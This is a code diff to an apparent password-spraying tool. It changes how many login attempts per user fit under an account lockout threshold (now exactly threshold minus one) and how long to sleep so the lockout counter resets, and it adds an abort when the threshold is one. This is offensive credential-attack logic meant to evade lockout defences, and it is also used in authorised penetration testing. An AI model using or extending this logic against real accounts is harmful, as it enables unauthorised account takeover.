@@ -226,22 +226,32 @@ class SpraySession:
     def get_safe_attempts_per_window(self) -> int:
         """
         Calculate the maximum attempts per user within the observation window
-        that won't trigger lockout. Returns a conservative value.
+        that won't trigger lockout.
+
+        Returns n-1 where n is the lockout threshold.
+        e.g., threshold=5 -> 4 attempts allowed
+              threshold=1 -> 0 attempts (cannot spray safely!)
+              threshold=0 -> unlimited (no lockout policy)
         """
         if self.policy.lockout_threshold == 0:
-            # No lockout policy - but still be reasonable
+            # No lockout policy
             return 100
 
-        # Stay well under the threshold (at least 2 attempts margin)
-        return max(1, self.policy.lockout_threshold - 2)
+        # Exactly n-1 to guarantee no lockout
+        return self.policy.lockout_threshold - 1
 
     def get_sleep_time_seconds(self) -> int:
-        """Get the sleep time needed between password batches."""
+        """
+        Get the sleep time needed between password batches.
+
+        Returns m+1 minutes (in seconds) where m is the observation window.
+        e.g., window=30 min -> sleep 31 min (1860 seconds)
+        """
         if self.policy.lockout_threshold == 0:
             return 0
 
-        # Sleep for the full observation window plus a small buffer
-        return (self.policy.lockout_observation_window_minutes * 60) + 60
+        # Exactly m+1 minutes to guarantee counter reset
+        return (self.policy.lockout_observation_window_minutes + 1) * 60
 
     def password_meets_policy(self, password: str, username: str = None) -> tuple:
         """
@@ -379,6 +389,18 @@ class SprayEngine:
 
         safe_attempts = self.session.get_safe_attempts_per_window()
         sleep_time = self.session.get_sleep_time_seconds()
+
+        # Check if spraying is even possible with this lockout policy
+        if safe_attempts <= 0:
+            self._print(
+                f"{Colors.RED}[!] Cannot spray safely: lockout threshold is {policy.lockout_threshold}{Colors.NC}",
+                level=1
+            )
+            self._print(
+                f"{Colors.RED}[!] Any failed attempt would lock accounts. Aborting.{Colors.NC}",
+                level=1
+            )
+            return False
 
         # Filter passwords that don't meet policy (length + complexity categories)
         # Note: username-in-password check is done per-user during spraying
